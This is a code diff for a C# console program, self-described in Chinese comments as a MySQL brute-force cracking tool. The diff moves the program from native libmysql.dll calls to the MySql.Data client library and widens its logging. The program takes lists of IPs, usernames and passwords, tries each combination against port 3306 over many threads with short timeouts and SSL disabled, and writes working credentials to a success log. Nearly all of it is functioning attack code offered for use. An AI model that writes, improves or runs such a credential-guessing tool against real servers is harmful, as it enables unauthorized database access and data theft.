@@ -1,15 +1,13 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 using System.Threading;
 using System.Text;
 using System.Linq;
 using System.Collections.Concurrent;
 using System.Diagnostics;
-using System.Data;
-using System.Data.Common;
+using MySql.Data.MySqlClient;
 using System.Net.NetworkInformation;
 
 namespace MySQLCracker
@@ -17,7 +15,7 @@ namespace MySQLCracker
     /// <summary>
     /// MySQL暴力破解工具主程序类
     /// 用于对MySQL服务器进行批量密码破解
-    /// 使用libmysql.dll进行底层连接，支持多线程并发操作
+    /// 使用MySql.Data.MySqlClient库进行连接，支持多线程并发操作
     /// </summary>
     class Program
     {
@@ -34,7 +32,6 @@ namespace MySQLCracker
         private static string pingLogFile = "mysql_ping_test.txt"; // Ping测试日志文件
         private static ConcurrentDictionary<string, bool> pingResultsCache = new ConcurrentDictionary<string, bool>(); // IP ping结果缓存
         private static ConcurrentDictionary<string, bool> ipCrackedCache = new ConcurrentDictionary<string, bool>(); // IP是否已爆破成功的缓存
-        private static bool isDebugMode = false; // 调试模式标志，控制详细日志输出
         
         /// <summary>
         /// 记录Ping测试日志
@@ -151,6 +148,22 @@ namespace MySQLCracker
                 Console.WriteLine("\n程序即将退出...");
                 Console.WriteLine("按任意键继续...");
                 Console.ReadKey(true);
+            };
+            
+            // 设置Task异常处理，捕获异步操作中未处理的异常
+            TaskScheduler.UnobservedTaskException += (sender, e) =>
+            {
+                e.SetObserved(); // 标记异常已处理
+                Exception ex = e.Exception;
+                Console.WriteLine("\n[严重错误] 异步操作发生未处理的异常:");
+                Console.WriteLine($"  错误类型: {ex?.GetType().Name ?? "未知"}");
+                Console.WriteLine($"  错误信息: {ex?.Message ?? "未知"}");
+                if (ex?.InnerException != null)
+                {
+                    Console.WriteLine($"  内部错误: {ex.InnerException.Message}");
+                }
+                Console.WriteLine($"  堆栈跟踪: {ex?.StackTrace ?? "未知"}");
+                // 不要退出程序，继续执行
             };
             Console.Title = "MySQL暴力破解工具";
             Console.WriteLine("=========================================");
@@ -400,7 +413,7 @@ namespace MySQLCracker
         /// </summary>
         private static void ShowHelp()
         {
-            Console.WriteLine("用法: MySQLCracker.exe -i ips.txt -u user.txt -p password.txt -x 500");
+            Console.WriteLine("用法: MySQLCracker.exe -i ip.txt -u user.txt -p password.txt -x 500");
             Console.WriteLine();
             Console.WriteLine("参数说明:");
             Console.WriteLine("  -i    指定IP地址文件路径（必需）");
@@ -470,15 +483,6 @@ namespace MySQLCracker
                     Console.WriteLine($"[提示] 当前系统CPU核心数: {cpuCount}，为确保程序稳定性，线程数已限制为CPU核心数的5倍以内");
                     threadCount = MAX_THREADS;
                 }
-
-                // 检查libmysql.dll是否存在
-            string libPath = Path.Combine("data", "libmySQL.dll");
-            if (!File.Exists(libPath))
-            {
-                Console.WriteLine($"[错误] libmysql.dll不存在于指定路径: {libPath}");
-                Console.WriteLine("请确保在data目录下放置了正确版本的libmysql.dll文件");
-                return false;
-            }
 
                 return true;
             }
@@ -953,36 +957,12 @@ namespace MySQLCracker
 
         /// <summary>
         /// 测试MySQL连接
-        /// 使用libmysql.dll进行底层连接测试
+        /// 使用MySql.Data.MySqlClient库进行连接测试
         /// </summary>
         /// <param name="ip">MySQL服务器IP地址</param>
         /// <param name="user">用户名</param>
         /// <param name="password">密码</param>
         /// <returns>如果连接成功返回true，否则返回false</returns>
-        /// <summary>
-        /// MySQL原生API函数声明
-        /// </summary>
-        [DllImport("libmySQL.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern IntPtr mysql_init(IntPtr mysql);
-
-        [DllImport("libmySQL.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern bool mysql_real_connect(IntPtr mysql, string host, string user, string password, string db, int port, IntPtr unix_socket, int client_flag);
-
-        [DllImport("libmySQL.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern void mysql_close(IntPtr mysql);
-
-        [DllImport("libmySQL.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern int mysql_errno(IntPtr mysql);
-
-        [DllImport("libmySQL.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern string mysql_error(IntPtr mysql);
-
-        [DllImport("libmySQL.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern int mysql_options(IntPtr mysql, uint option, IntPtr arg);
-        
-        [DllImport("libmySQL.dll", CallingConvention = CallingConvention.Cdecl)]
-        private static extern int mysql_ping(IntPtr mysql);
-
         private static bool TestMySQLConnection(string ip, string user, string password)
         {
             Stopwatch sw = new Stopwatch();
@@ -992,161 +972,75 @@ namespace MySQLCracker
             if (cts.IsCancellationRequested)
                 return false;
 
-            IntPtr mysql = IntPtr.Zero;
             bool success = false;
+            MySqlConnection connection = null;
 
             try
             {
-                // 1. 初始化MySQL连接句柄
-                mysql = mysql_init(IntPtr.Zero);
+                // 1. 创建连接字符串
+                string connectionString = $"Server={ip};Port=3306;User ID={user};Password={password};Database=;Connect Timeout=1;SslMode=Disabled;";
                 
-                // 2. 检查句柄是否初始化成功
-                if (mysql == IntPtr.Zero)
-                {
-                    return false;
-                }
-
-                // 3. 设置连接超时为1秒（优化爆破速度）
-                uint MYSQL_OPT_CONNECT_TIMEOUT = 0x0001;
-                int timeoutValue = 1;
-                IntPtr timeoutPtr = Marshal.AllocHGlobal(sizeof(int));
-                Marshal.WriteInt32(timeoutPtr, timeoutValue);
-                mysql_options(mysql, MYSQL_OPT_CONNECT_TIMEOUT, timeoutPtr);
-                Marshal.FreeHGlobal(timeoutPtr);
-
-                // 4. 直接调用mysql_real_connect进行连接（基于易语言版本优化）
-                success = mysql_real_connect(mysql, ip, user, password, null, 3306, IntPtr.Zero, 0);
+                // 2. 创建MySqlConnection对象
+                connection = new MySqlConnection(connectionString);
+                
+                // 3. 打开连接
+                connection.Open();
+                
+                // 4. 连接成功
+                success = true;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                // 捕获异常但不记录详细日志，提高性能
+                // 捕获异常并记录详细日志
+                //Console.WriteLine($"\n[调试] 连接失败 - IP: {ip}, 用户: {user}, 密码: {password}, 错误信息: {ex.Message}");
                 success = false;
             }
             finally
             {
-                // 关闭连接（简洁实现）
-                if (mysql != IntPtr.Zero)
+                // 关闭连接
+                if (connection != null)
                 {
-                    try { mysql_close(mysql); } catch {}
+                    try { connection.Close(); } catch {}
                 }
 
                 sw.Stop();
                 long elapsedMs = sw.ElapsedMilliseconds;
 
-                // 最小化日志记录，提高性能
+                // 记录日志
                 if (success)
-                {                    
+                {
                     string successLog = $"[{DateTime.Now:HH:mm:ss}] 成功 - IP: {ip}, 用户: {user}, 密码: {password}, 耗时: {elapsedMs}ms";
                     Console.WriteLine($"\n{successLog}");
                     lock (summaryLock)
                     {
-                        File.AppendAllText(successLogFile, successLog + Environment.NewLine, Encoding.UTF8);
+                        try
+                        {
+                            File.AppendAllText(successLogFile, successLog + Environment.NewLine, Encoding.UTF8);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"\n[错误] 无法写入成功日志: {ex.Message}");
+                        }
                     }
                 }
-                else if (isDebugMode || new Random().Next(0, 100) < 1) // 仅记录1%的失败日志或调试模式
-                {                    
-                    string failLog = $"[{DateTime.Now:HH:mm:ss}] 失败 - IP: {ip}, 用户: {user}, 耗时: {elapsedMs}ms";
+                else // 记录所有失败日志
+                {
+                    string failLog = $"[{DateTime.Now:HH:mm:ss}] 失败 - IP: {ip}, 用户: {user}, 密码: {password}, 耗时: {elapsedMs}ms";
                     lock (summaryLock)
                     {
-                        File.AppendAllText(failLogFile, failLog + Environment.NewLine, Encoding.UTF8);
+                        try
+                        {
+                            File.AppendAllText(failLogFile, failLog + Environment.NewLine, Encoding.UTF8);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"\n[错误] 无法写入失败日志: {ex.Message}");
+                        }
                     }
                 }
             }
 
             return success;
-        }
-
-        /// <summary>
-        /// 获取错误信息的类别
-        /// 用于对错误进行分类，方便日志管理
-        /// </summary>
-        /// <param name="errorMsg">MySQL错误信息</param>
-        /// <returns>错误类别字符串</returns>
-        private static string GetErrorCategory(string errorMsg)
-        {
-            if (string.IsNullOrEmpty(errorMsg))
-                return "未知错误";
-
-            string lowerMsg = errorMsg.ToLower();
-            
-            if (lowerMsg.Contains("access denied"))
-                return "拒绝访问";
-            else if (lowerMsg.Contains("connection refused"))
-                return "连接被拒绝";
-            else if (lowerMsg.Contains("timed out"))
-                return "连接超时";
-            else if (lowerMsg.Contains("host '"))
-                return "主机不允许连接";
-            else if (lowerMsg.Contains("no such host"))
-                return "主机不存在";
-            else if (lowerMsg.Contains("is not allowed to connect"))
-                return "不允许从该主机连接";
-            else if (lowerMsg.Contains("too many connections"))
-                return "连接数过多";
-            else if (lowerMsg.Contains("unknown user"))
-                return "未知用户";
-            else
-                return "其他错误";
-        }
-
-        /// <summary>
-        /// MySQL C API 封装类
-        /// 提供对libmysql.dll的P/Invoke调用
-        /// </summary>
-        private class MySQLNative
-        {            
-            // libmysql.dll路径
-            private const string MYSQL_DLL = "libmySQL.dll";
-
-            // MySQL选项常量
-            public const uint MYSQL_OPT_CONNECT_TIMEOUT = 0;
-            public const uint MYSQL_OPT_READ_TIMEOUT = 1;
-            public const uint MYSQL_OPT_WRITE_TIMEOUT = 2;
-
-            /// <summary>
-            /// 初始化MySQL句柄
-            /// </summary>
-            [DllImport(MYSQL_DLL, CallingConvention = CallingConvention.Cdecl)]
-            public static extern IntPtr mysql_init(IntPtr mysql);
-
-            /// <summary>
-            /// 设置MySQL选项 - 使用IntPtr而不是ref参数，避免多线程引用问题
-            /// </summary>
-            [DllImport(MYSQL_DLL, CallingConvention = CallingConvention.Cdecl)]
-            public static extern int mysql_options(IntPtr mysql, uint option, IntPtr arg);
-
-            /// <summary>
-            /// 连接到MySQL服务器
-            /// </summary>
-            [DllImport(MYSQL_DLL, CallingConvention = CallingConvention.Cdecl)]
-            public static extern IntPtr mysql_real_connect(
-                IntPtr mysql,
-                string host,
-                string user,
-                string passwd,
-                string db,
-                uint port,
-                string unix_socket,
-                uint client_flag
-            );
-
-            /// <summary>
-            /// 获取最后一个错误信息
-            /// </summary>
-            [DllImport(MYSQL_DLL, CallingConvention = CallingConvention.Cdecl)]
-            public static extern IntPtr mysql_error(IntPtr mysql);
-
-            /// <summary>
-            /// 获取最后一个错误代码
-            /// </summary>
-            [DllImport(MYSQL_DLL, CallingConvention = CallingConvention.Cdecl)]
-            public static extern uint mysql_errno(IntPtr mysql);
-
-            /// <summary>
-            /// 关闭MySQL连接
-            /// </summary>
-            [DllImport(MYSQL_DLL, CallingConvention = CallingConvention.Cdecl)]
-            public static extern void mysql_close(IntPtr mysql);
         }
     }
 }
